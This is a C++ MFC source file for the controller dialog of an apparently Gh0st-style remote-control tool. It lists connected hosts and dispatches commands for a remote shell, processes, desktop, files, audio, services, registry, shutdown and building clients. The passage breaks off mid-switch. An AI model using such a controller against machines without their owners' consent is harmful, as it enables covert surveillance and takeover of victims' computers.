
// ServerDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Server.h"
#include "ServerDlg.h"
#include "afxdialogex.h"
#include "DlgServerSet.h"
#include "DlgRemoteMessageDlg.h"
#include "DlgCreateClient.h"
#include "DlgCmdManager.h"
#include "DlgProcessManager.h"
#include "DlgThreaderManager.h"
#include "DlgHandleManager.h"
#include "DlgModuleManager.h"
#include "DlgRemoteOpenProcess.h"
#include "DlgWindowManager.h"
#include "DlgRemoteControl.h"
#include "DlgFileManager.h"
#include "DlgAudioManager.h"
#include "DlgServiceManager.h"
#include "DlgRegisterManager.h"
#define UM_BUTTON_CMD_MANAGER WM_USER+0x10
#define UM_NOTIFY_ICON_DATA WM_USER+0x20



// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

COLUMN_DATA _Column_Data_Online[]=
{
	{ "IP" ,           120},
	{ "计算机名/备注", 160},
	{ "操作系统",      128 },
	{ "CPU",           180},
	{ "摄像头",        80},
	{ "PING",          150}
};

COLUMN_DATA _Column_Data_Message[] =
{
	{ "信息类型" ,   200 },
	{ "时间",        200 },
	{ "信息内容",    490 }
};

ULONG m_ConnectionCount = 0;

 static UINT __Indicator[] =
{
	IDR_STATUSBAR_SERVER_STRING
};


//定义配置文件的全局对象
_CConfigFlie __ConfigFlie;
//定义通讯引擎的全局指针
_CIOCPServer*  __IOCPServer = NULL;
//定义窗口类的全局指针
CServerDlg* __ServerDlg = NULL;

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}
void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()

// CServerDlg 对话框

CServerDlg::CServerDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(IDD_SERVER_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	m_Bitmap[0].LoadBitmap(IDB_BITMAP1);
	m_ListenPort = __ConfigFlie.GetInt("Settings", "ListenPort");
	m_MaxConnection = __ConfigFlie.GetInt("Settings", "MaxConnection");

	__ServerDlg = this;
}
void CServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_SERVER_DIALOG_ONLINE, m_CListCtrl_Server_Dialog_Online);
	DDX_Control(pDX, IDC_LIST_SERVER_DIALOG_MESSAGE, m_CListCtrl_Server_Dialog_Message);
}
BEGIN_MESSAGE_MAP(CServerDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_WM_CLOSE()

	ON_COMMAND(ID_MENU_SERVER_DIALOG_SET, &CServerDlg::OnMenuServerDialogSet)
	ON_COMMAND(ID_MENU_SERVER_DIALOG_EXIT, &CServerDlg::OnMenuServerDialogExit)
	ON_COMMAND(ID_MENU_SERVER_DIALOG_ADD, &CServerDlg::OnMenuServerDialogAdd)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_SERVER_DIALOG_ONLINE, &CServerDlg::OnNMRClickListServerDialogOnline)
	ON_COMMAND(ID_MENU_LIST_SERVER_DIALOG_ONLINE_DISCONNECTION, &CServerDlg::OnMenuListServerDialogOnlineDisconnection)
	ON_COMMAND(ID_MENU_LIST_SERVER_DIALOG_ONLINE_REMOTE_MESSAGE, &CServerDlg::OnMenuListServerDialogOnlineRemoteMessage)
	ON_COMMAND(ID_MENU_LIST_SERVER_DIALOG_ONLINE_REMOTE_SHUTDOWN, &CServerDlg::OnMenuListServerDialogOnlineRemoteShutdown)
	
	//CMD管理
	//ON_MESSAGE(UM_BUTTON_CMD_MANAGER,OnButtonCmdManager)
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_CMD_MANAGER,&CServerDlg::OnButtonCmdManager)
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_PROCESS_MANAGER, &CServerDlg::OnButtonProcessManager)
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_WINDOW_MANAGER, &CServerDlg::OnButtonWindowsManager)
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_REMOTE_CONTROL, &CServerDlg::OnButtonRemoteControl)
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_FILE_MANAGER, &CServerDlg::OnButtonFileManager)
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_AUDIO_MANAGER, &CServerDlg::OnButtonAudioManager)
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_CLEAN_MANAGER, &CServerDlg::OnButtonCleanManager)
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_VIDEO_MANAGER, &CServerDlg::OnButtonVideoManager)
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_SERVICE_MANAGER, &CServerDlg::OnButtonServiceManager)
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_REGISTER_MANAGER, &CServerDlg::OnButtonRegisterManager)
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_SERVER_MANAGER, &CServerDlg::OnButtonServerManager)
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_CREATE_CLIENT, &CServerDlg::OnButtonCreateClient)
	ON_COMMAND(IDM_BUTTON_TOOLBAR_SERVER_DIALOG_SERVER_ABOUT, &CServerDlg::OnButtonServerAbout)
	

	/*托盘消息*/
	ON_MESSAGE(UM_NOTIFY_ICON_DATA, (LRESULT(__thiscall CWnd::*)(WPARAM,LPARAM))OnNotifyIconData)
	ON_COMMAND(ID_NOTITYICONDATA_SHOW, &CServerDlg::OnNotityicondataShow)
	ON_COMMAND(ID_NOTITYICONDATA_EXIT, &CServerDlg::OnNotityicondataExit)

	ON_WM_TIMER()
	/*自定义函数*/
	//用户上线
	ON_MESSAGE(UM_CLIENT_LOGIN,OnClientLogin)
	//远程通讯对话框
	ON_MESSAGE(UM_OPEN_REMOTE_MESSAGE_DIALOG, OnRemoteMessageDialog)
	//远程进程对话框
	ON_MESSAGE(UM_OPEN_PROCESS_MANAGER_DIALOG, OnProcessManagerDialog)
	//远程进程线程对话框
	ON_MESSAGE(UM_OPEN_THREADER_MANAGER_DIALOG,OnThreaderManagerDialog)
	//远程进程句柄对话框
	ON_MESSAGE(UM_OPEN_HANDLE_MANAGER_DIALOG, OnHandleManagerDialog)
	//远程进程模块对话框
	ON_MESSAGE(UM_OPEN_MODULE_MANAGER_DIALOG, OnModuleManagerDialog)
	//远程Cmd管理对话框
	ON_MESSAGE(UM_OPEN_CMD_MANAGER_DIALOG, OnCmdManagerDialog)
	//窗口管理
	ON_MESSAGE(UM_OPEN_WINDOW_MANAGER_DIALOG, OnWindowManagerDialog)
	//远程控制
	ON_MESSAGE(UM_OPEN_REMOTE_CONTROLLER_DIALOG,OnRemoteControlDialog)
	//文件管理
	ON_MESSAGE(UM_OPEN_FILE_MAMAGER_DIALOG, OnFileManagerDialog)
	//语音管理
	ON_MESSAGE(UM_OPEN_AUDIO_MAMAGER_DIALOG, OnAudioManagerDialog)
	//视频管理
	ON_MESSAGE(UM_OPEN_VIDEO_MAMAGER_DIALOG, OnVideoManagerDialog)
	//服务管理
	ON_MESSAGE(UM_OPEN_SERVICE_MAMAGER_DIALOG, OnServiceManagerDialog)
	//注册表管理
	ON_MESSAGE(UM_OPEN_REGISTER_MAMAGER_DIALOG,OnRegisterManagerDialog)
END_MESSAGE_MAP()
// CServerDlg 消息处理程序

BOOL CServerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}
	SetTimer(0, 1000, NULL);
	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标



	// TODO: 在此添加额外的初始化代码
	InitListControl();
	InitSoildMenu();
	InitTureToolBarMain();
	InitStatusBar();
	InitNotifyIconData();
	ServerStart();

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}
void CServerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}
// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CServerDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}
//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CServerDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}
void CServerDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);
	// TODO: 在此处添加消息处理程序代码

	if (m_StatusBar.m_hWnd != NULL)   //状态栏
	{
		CRect Rect;
		Rect.top = cy - 20;
		Rect.left = 0;
		Rect.bottom = cy;
		Rect.right = cx;
		m_StatusBar.MoveWindow(Rect);
		m_StatusBar.SetPaneInfo(0, m_StatusBar.GetItemID(0), SBPS_POPOUT, cx);
	}

	if (m_TureColorToolBar.m_hWnd != NULL)  //工具条
	{
		CRect Rect;
		Rect.top = Rect.left = 0;
		Rect.right = cx;
		Rect.bottom = 80;
		m_TureColorToolBar.MoveWindow(Rect);
	}

}
void CServerDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	if (::MessageBox(NULL,"你确定退出？","Remote",MB_OKCANCEL)==IDOK)
	{
		//立即销毁托盘！！
		Shell_NotifyIcon(NIM_DELETE, &m_NotifyIconData);
		if (__IOCPServer != NULL)
		{
			delete __IOCPServer;
			__IOCPServer = NULL;
		}
		CDialogEx::OnClose();
	}
	
}

//初始化控件
VOID CServerDlg::InitListControl()
{
	for (int i = 0; i < sizeof(_Column_Data_Online) / sizeof(COLUMN_DATA); i++)
	{
		m_CListCtrl_Server_Dialog_Online.InsertColumn(i, _Column_Data_Online[i].TitleData,
			LVCFMT_CENTER, _Column_Data_Online[i].TitleWidth);
	}
	m_CListCtrl_Server_Dialog_Online.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	for (int i = 0; i < sizeof(_Column_Data_Message) / sizeof(COLUMN_DATA); i++)
	{
		m_CListCtrl_Server_Dialog_Message.InsertColumn(i,
			_Column_Data_Message[i].TitleData,
			LVCFMT_CENTER, _Column_Data_Message[i].TitleWidth);
	}
	m_CListCtrl_Server_Dialog_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);
}
VOID CServerDlg::InitSoildMenu()
{
	HMENU Menu;
	Menu = LoadMenu(NULL, MAKEINTRESOURCE(IDC_MENU_SERVER_DIALOG_MAIN));  //载入菜单资源
	::SetMenu(this->GetSafeHwnd(), Menu);								 //为窗口设置菜单
	::DrawMenuBar(this->GetSafeHwnd());									//显示菜单
}
VOID CServerDlg::InitStatusBar()
{
	if (!m_StatusBar.Create(this) ||
		!m_StatusBar.SetIndicators(__Indicator,
			sizeof(__Indicator) / sizeof(UINT)))
	{
		return;
	}
	CRect v1;
	GetWindowRect(&v1);  //触发一个Onsize函数
	v1.bottom += 1;      //
	MoveWindow(v1);
}
VOID CServerDlg::InitTureToolBarMain()
{
	if (!m_TureColorToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_TureColorToolBar.LoadToolBar(IDR_TOOLBAR_SERVER_MAIN))
	{
		return;
	}
	m_TureColorToolBar.LoadTrueColorToolBar
	(
		48,
		IDB_BITMAP_TOOLBAR_MAIN,
		IDB_BITMAP_TOOLBAR_MAIN,
		IDB_BITMAP_TOOLBAR_MAIN
	);
	
	RECT v1, v2;
	GetWindowRect(&v2);
	v1.left = 0;
	v1.top = 0;
	v1.bottom = 80;
	v1.right = v2.right-v2.left+10;
	m_TureColorToolBar.MoveWindow(&v1, TRUE);

	m_TureColorToolBar.SetButtonText(0, "终端管理");  //在位图的下面添加文字
	m_TureColorToolBar.SetButtonText(1, "进程管理");
	m_TureColorToolBar.SetButtonText(2, "窗口管理");
	m_TureColorToolBar.SetButtonText(3, "桌面管理");
	m_TureColorToolBar.SetButtonText(4, "文件管理");
	m_TureColorToolBar.SetButtonText(5, "语音管理");
	m_TureColorToolBar.SetButtonText(6, "系统清理");
	m_TureColorToolBar.SetButtonText(7, "视频管理");
	m_TureColorToolBar.SetButtonText(8, "服务管理");
	m_TureColorToolBar.SetButtonText(9, "注册表管理");
	m_TureColorToolBar.SetButtonText(10, "服务端管理");
	m_TureColorToolBar.SetButtonText(11, "客户端管理");
	m_TureColorToolBar.SetButtonText(12, "帮助");
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);//显示

}
VOID CServerDlg::InitNotifyIconData()
{
	m_NotifyIconData.cbSize = sizeof(NOTIFYICONDATA);
	//对话句柄
	m_NotifyIconData.hWnd = m_hWnd;
	m_NotifyIconData.uID = IDR_MAINFRAME;
	//托盘的功能
	m_NotifyIconData.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;
	m_NotifyIconData.uCallbackMessage = UM_NOTIFY_ICON_DATA;//自定义消息 
	m_NotifyIconData.hIcon = m_hIcon;
	CString v1 = "长乐西苑";
	lstrcpyn(m_NotifyIconData.szTip, v1, 
		sizeof(m_NotifyIconData.szTip) /
		sizeof(m_NotifyIconData.szTip[0]));
	Shell_NotifyIcon(NIM_ADD, &m_NotifyIconData);//显示托盘
}
void CServerDlg::OnNotifyIconData(WPARAM ParamterData1, LPARAM ParamterData2)
{
	switch ((UINT)ParamterData2)
	{
	case WM_LBUTTONDOWN:
	case WM_LBUTTONDBLCLK:
	{
		if (!IsWindowVisible())   //当前主对话框是否显示
		{
			//窗口显示
			ShowWindow(SW_SHOW);
		}
		else
		{
			ShowWindow(SW_HIDE);
		}
		break;
	}

	case WM_RBUTTONDOWN:
	{
		CMenu Menu;
		Menu.LoadMenu(IDR_MENU_NOTIFY_ICON_DATA);
		CPoint point;
		GetCursorPos(&point);
		Menu.GetSubMenu(0)->TrackPopupMenu(
			TPM_LEFTBUTTON | TPM_RIGHTBUTTON,
			point.x, point.y, this, NULL);
		break;
	}
	}
}
void CServerDlg::OnMenuServerDialogSet()
{
	// TODO: 在此添加命令处理程序代码
	CDlgServerSet DialogObject;//构造类对象
	DialogObject.DoModal();

}
void CServerDlg::OnMenuServerDialogExit()
{
	// TODO: 在此添加命令处理程序代码
	SendMessage(WM_CLOSE);

}
void CServerDlg::OnMenuServerDialogAdd()
{
	// 插入数据
	int i = m_CListCtrl_Server_Dialog_Online.InsertItem(m_CListCtrl_Server_Dialog_Online.GetItemCount(), "张飞");
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 1, "23");
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 2, "将军");
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 3, "蜀国");

}
void CServerDlg::OnNMRClickListServerDialogOnline(NMHDR *pNMHDR, LRESULT *pResult)
{
	//Online控制列表鼠标右键点击消息
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	CMenu Menu;
	Menu.LoadMenu(IDR_MENU_LIST_SERVER_DIALOG_ONLINE_MAIN);
	CMenu* SubMenu = Menu.GetSubMenu(0);
	//获得鼠标位置
	CPoint Point;
	GetCursorPos(&Point);

	int v1 = SubMenu->GetMenuItemCount();//统计菜单的项目数
	//如果没有选中项目。将显示灰色（无效）菜单
	if (m_CListCtrl_Server_Dialog_Online.GetSelectedCount()==0)
	{
		for (int i = 0; i < v1; i++)
		{
			SubMenu->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
		}
	}
	
	//为菜单添加位图资源
	Menu.SetMenuItemBitmaps(ID_MENU_LIST_SERVER_DIALOG_ONLINE_DISCONNECTION,MF_BYCOMMAND,&m_Bitmap[0],&m_Bitmap[0]);
	Menu.SetMenuItemBitmaps(ID_MENU_LIST_SERVER_DIALOG_ONLINE_REMOTE_MESSAGE, MF_BYCOMMAND, &m_Bitmap[0], &m_Bitmap[0]);
	Menu.SetMenuItemBitmaps(ID_MENU_LIST_SERVER_DIALOG_ONLINE_REMOTE_SHUTDOWN, MF_BYCOMMAND, &m_Bitmap[0], &m_Bitmap[0]);
	
	//在指定的位置显示一个浮动的弹出菜单和跟踪项目的选择在弹出菜单中的。
	SubMenu->TrackPopupMenu(TPM_LEFTALIGN, Point.x, Point.y, this);
	*pResult = 0;
}
void CServerDlg::OnMenuListServerDialogOnlineDisconnection()
{
	// TODO: 在此添加命令处理程序代码
	//向被控端发送一个消息
	BYTE bToken = CLIENT_GET_OUT;
	SendSelectedCommand(&bToken, sizeof(BYTE));

	//清楚CtrlCList列表
	CString ClientAddressData;
	int SelectedCount = m_CListCtrl_Server_Dialog_Online.GetSelectedCount();
	int i = 0;
	for (i = 0; i < SelectedCount; i++)
	{
		POSITION Pos = m_CListCtrl_Server_Dialog_Online.GetFirstSelectedItemPosition();
		int Item = m_CListCtrl_Server_Dialog_Online.GetNextSelectedItem(Pos);
		ClientAddressData = m_CListCtrl_Server_Dialog_Online.GetItemText(Item, 0);
		m_CListCtrl_Server_Dialog_Online.DeleteItem(Item);
		ClientAddressData += "强制断开";

	  	ShowDialogMessage(true, ClientAddressData);
	}

}
void CServerDlg::OnMenuListServerDialogOnlineRemoteMessage()
{
	// TODO: 在此添加命令处理程序代码
	BYTE bToken = CLIENT_REMOTE_MESSAGE;   //向被控端发送一个COMMAND_SYSTEM
	SendSelectedCommand(&bToken, sizeof(BYTE));

}
void CServerDlg::OnMenuListServerDialogOnlineRemoteShutdown()
{
	// TODO: 在此添加命令处理程序代码
	BYTE bToken = CLIENT_SHUT_DOWN_REQUEST;
	SendSelectedCommand(&bToken, sizeof(BYTE));

	//清除CtrlCList列表
	CString ClientAddress;
	int SelectedCount = m_CListCtrl_Server_Dialog_Online.GetSelectedCount();
	int i = 0;
	for (i = 0; i < SelectedCount; i++)
	{
		POSITION Pos = m_CListCtrl_Server_Dialog_Online.GetFirstSelectedItemPosition();
		int Item = m_CListCtrl_Server_Dialog_Online.GetNextSelectedItem(Pos);
		ClientAddress = m_CListCtrl_Server_Dialog_Online.GetItemText(Item, 0);
		m_CListCtrl_Server_Dialog_Online.DeleteItem(Item);
		ClientAddress += "强制断开";
		ShowDialogMessage(true, ClientAddress);
	}
}

VOID CServerDlg::ShowDialogMessage(BOOL IsOk, CString Message)
{
	CString v1;
	CString v2;
	CString v3;

	CTime Time = CTime::GetCurrentTime();
	v2 = Time.Format("%H:%M:%S");
	if (IsOk)
	{
		v1 = L"执行成功";
	}
	else
	{
		v1 = L"执行失败";
	}
	m_CListCtrl_Server_Dialog_Message.InsertItem(0, v1);
	m_CListCtrl_Server_Dialog_Message.SetItemText(0, 1, v2);
	m_CListCtrl_Server_Dialog_Message.SetItemText(0, 2, Message);

	if (Message.Find("上线")>0)
	{
		m_ConnectionCount++;
	}
	else if (Message.Find("下线")>0)
	{
		m_ConnectionCount--;
	}
	else if (Message.Find("断开")>0)
	{
		m_ConnectionCount--;
	}

	m_ConnectionCount = (m_ConnectionCount <= 0 ? 0 : m_ConnectionCount);
	v3.Format("有%d个主机在线", m_ConnectionCount);
	//在状态栏上显示文字
	m_StatusBar.SetPaneText(0, v3); //写入状态栏信息

}
//CMD
VOID CServerDlg::OnButtonCmdManager()
{
	POSITION Pos = m_CListCtrl_Server_Dialog_Online.GetFirstSelectedItemPosition();
	while (Pos)
	{
		int Item = m_CListCtrl_Server_Dialog_Online.GetNextSelectedItem(Pos);
		BYTE IsToken = CLIENT_CMD_MANAGER;
		SendSelectedCommand(&IsToken, sizeof(BYTE));
	}
	return;
}
//进程管理按钮
VOID CServerDlg::OnButtonProcessManager()
{
	/*
	POSITION Position = m_CListCtrl_Server_Dialog_Online.GetFirstSelectedItemPosition();
	if (!Position)
	{
		PostMessage(UM_)
	}*/
	BYTE IsToken = CLIENT_PROCESS_MANAGER;
	SendSelectedCommand(&IsToken, sizeof(BYTE));
}
//窗口管理
VOID CServerDlg::OnButtonWindowsManager()
{
	BYTE IsToken = CLIENT_WINDOWS_MANAGER;
	SendSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
//桌面管理
VOID CServerDlg::OnButtonRemoteControl()
{
	BYTE IsToken = CLIENT_REMOTE_CONTROLLER;
	SendSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
//文件管理
VOID CServerDlg::OnButtonFileManager()
{
	BYTE IsToken = CLIENT_FILE_MANAGER;
	SendSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
//语音管理
VOID CServerDlg::OnButtonAudioManager()
{
	BYTE IsToken = CLIENT_AUDIO_MANAGER;
	SendSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
VOID CServerDlg::OnButtonCleanManager()
{
	MessageBox(0);
	return;
}
VOID CServerDlg::OnButtonVideoManager()
{
	MessageBox(0);
	return;
}
//服务管理
VOID CServerDlg::OnButtonServiceManager()
{
	BYTE IsToken = CLIENT_SERVICE_MANAGER;
	SendSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
VOID CServerDlg::OnButtonRegisterManager()
{
	BYTE IsToken = CLIENT_REGISTER_MANAGER;
	SendSelectedCommand(&IsToken, sizeof(BYTE));
	return;
}
VOID CServerDlg::OnButtonServerManager()
{
	MessageBox(0);
	return;
}
//客户端IP Port设置
VOID CServerDlg::OnButtonCreateClient()
{
	CDlgCreateClient Dialog;
	Dialog.DoModal();
	return;
}
VOID CServerDlg::OnButtonServerAbout()
{
	MessageBox(0);
	return;
}
void CServerDlg::OnNotityicondataShow()
{
	// TODO: 在此添加命令处理程序代码
}
void CServerDlg::OnNotityicondataExit()
{
	// TODO: 在此添加命令处理程序代码
	CServerDlg::OnClose();
}
void CServerDlg::OnTimer(UINT_PTR nIDEvent)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值

	MyGetSystemTime();

	CDialogEx::OnTimer(nIDEvent);
}

VOID CServerDlg::MyGetSystemTime()
{
	char TimeData[MAX_PATH];
	auto TimeObject = time(NULL);
	tm v1;
	localtime_s(&v1, &TimeObject);
	strftime(TimeData, _countof(TimeData), "%y-%m-%d %H:%M:%S", &v1);
	CString WindowsTitle;
	WindowsTitle=TimeData;
	//GetWindowText(this);
	WindowsTitle = "Server       " + WindowsTitle;
	SetWindowText(WindowsTitle);
}
//通讯模块
VOID CServerDlg::ServerStart()
{
	__IOCPServer = new _CIOCPServer;  //动态申请我们的类对象
	if (__IOCPServer == NULL)
	{
		return;
	}
	if (__IOCPServer->ServerRun(m_ListenPort,WindowNotifyProcedure) == TRUE)
	{
		//MessageBox(0);
	}
	CString v1;
	v1.Format("监听端口：%d成功", m_ListenPort);
	ShowDialogMessage(TRUE, v1);
}

VOID CALLBACK CServerDlg::WindowNotifyProcedure(PCONTEXT_OBJECT ContextObject)
{
	WindowHandleIO(ContextObject);
}

VOID CServerDlg::WindowHandleIO(CONTEXT_OBJECT* ContextObject)
{
	if (ContextObject == NULL)
	{
		return;
	}
	
	if (ContextObject->DialogID>0)
	{
		switch (ContextObject->DialogID)
		{
		case CMD_MANAGER_DIALOG:
		{
			CDlgCmdManager* Dialog = (CDlgCmdManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case PROCESS_MANAGER_DIALOG:
		{
			CDlgProcessManager* Dialog = (CDlgProcessManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case THREADER_MANAGER_DIALOG:
		{
			CDlgThreaderManager* Dialog = (CDlgThreaderManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case WINDOW_MANAGER_DIALOG:
		{
			CDlgWindowManager* Dialog = (CDlgWindowManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case REMOTE_CONTROL_DIALOG:
		{
			CDlgRemoteControl* Dialog = (CDlgRemoteControl*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case FILE_MANAGER_DIALOG:
		{
			CDlgFileManager* Dialog = (CDlgFileManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case AUDIO_MANAGER_DIALOG:
		{
			CDlgAudioManager* Dialog = (CDlgAudioManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case SERVICE_MANAGER_DIALOG:
		{
			CDlgServiceManager* Dialog = (CDlgServiceManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		case REGISTER_MANAGER_DIALOG:
		{
			CDlgRegisterManager* Dialog = (CDlgRegisterManager*)ContextObject->DialogHandle;
			Dialog->WindowHandleIO();
			break;
		}
		}
		return;
	}
	switch (ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(0)[0])
	{
	case CLIENT_LOGIN:   //用户登入请求
	{
		__ServerDlg->PostMessageA(UM_CLIENT_LOGIN,
			NULL, (LPARAM)ContextObject);
		break;
	}

	case CLIENT_GET_REPLY:
	{
		CancelIo((HANDLE)ContextObject->ClientSocket);
		closesocket(ContextObject->ClientSocket);
		ContextObject->ClientSocket = NULL;
	
		Sleep(10);
		break;
	}
	case CLIENT_REMOTE_MESSAGE_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_REMOTE_MESSAGE_DIALOG, 0, (LPARAM)ContextObject);
		Sleep(10);
		break;
	}
	case CLIENT_SHUT_DOWN_REPLY:
	{
		CancelIo((HANDLE)ContextObject->ClientSocket);
		closesocket(ContextObject->ClientSocket);
		ContextObject->ClientSocket = NULL;
		Sleep(10);
		break;
	}
	case CLIENT_CMD_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_CMD_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		Sleep(10);
		break;
	}
	case CLIENT_PROCESS_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_PROCESS_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		Sleep(10);
		break;
	}

	case CLIENT_PROCESS_MANAGER_ENUM_THREADER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_THREADER_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		Sleep(10);
		break;
	}

	case CLIENT_PROCESS_MANAGER_ENUM_HANDLE_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_HANDLE_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		Sleep(10);
		break;
	}

	case CLIENT_PROCESS_MANAGER_ENUM_MODULE_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_MODULE_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		Sleep(10);
		break;
	}

	case CLIENT_WINDOWS_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_WINDOW_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
		Sleep(10);
		break;
	}
	case CLIENT_REMOTE_CONTROLLER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_REMOTE_CONTROLLER_DIALOG, 0, (LPARAM)ContextObject);
		Sleep(10);
		break;
	}
	case CLIENT_FILE_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_FILE_MAMAGER_DIALOG, 0, (LPARAM)ContextObject);
		Sleep(10);
		break;
	}
	case CLIENT_AUDIO_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_AUDIO_MAMAGER_DIALOG, 0, (LPARAM)ContextObject);
		Sleep(10);
		break;
	}
	case CLIENT_VIDEO_MANAGER_REPLY:
	{
